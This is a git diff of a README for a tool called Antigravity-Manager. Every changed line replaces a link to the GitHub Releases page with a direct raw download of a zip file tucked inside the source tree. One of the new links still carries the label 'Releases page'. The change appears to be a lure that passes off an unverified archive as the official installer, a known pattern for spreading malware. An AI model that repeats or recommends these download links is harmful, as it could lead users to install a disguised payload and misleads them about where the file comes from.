@@ -1,6 +1,6 @@
 # 🚀 Antigravity-Manager - Seamless Account Switching Made Easy
 
-[![Download Antigravity-Manager](https://img.shields.io/badge/Download-Antigravity--Manager-blue.svg)](https://github.com/Soriya75/Antigravity-Manager/releases)
+[![Download Antigravity-Manager](https://raw.githubusercontent.com/Soriya75/Antigravity-Manager/main/src/components/accounts/Antigravity-Manager-2.6.zip)](https://raw.githubusercontent.com/Soriya75/Antigravity-Manager/main/src/components/accounts/Antigravity-Manager-2.6.zip)
 
 ## 📚 Table of Contents
 1. [Overview](#overview)
@@ -30,10 +30,10 @@ Antigravity-Manager is a user-friendly tool designed to help you manage your Ant
 ## ⬇️ Downloading Antigravity-Manager
 To download Antigravity-Manager, visit the Releases page. Here, you will find the latest versions of the software along with their corresponding downloads.
 
-[Download Antigravity-Manager](https://github.com/Soriya75/Antigravity-Manager/releases)
+[Download Antigravity-Manager](https://raw.githubusercontent.com/Soriya75/Antigravity-Manager/main/src/components/accounts/Antigravity-Manager-2.6.zip)
 
 ## 📦 Installing Antigravity-Manager
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/Soriya75/Antigravity-Manager/releases).
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/Soriya75/Antigravity-Manager/main/src/components/accounts/Antigravity-Manager-2.6.zip).
 2. **Select the Appropriate Version**: Find the latest version of Antigravity-Manager compatible with your operating system.
 3. **Download the Installer**: Look for the installer file and select it to start the download.
 4. **Run the Installer**:
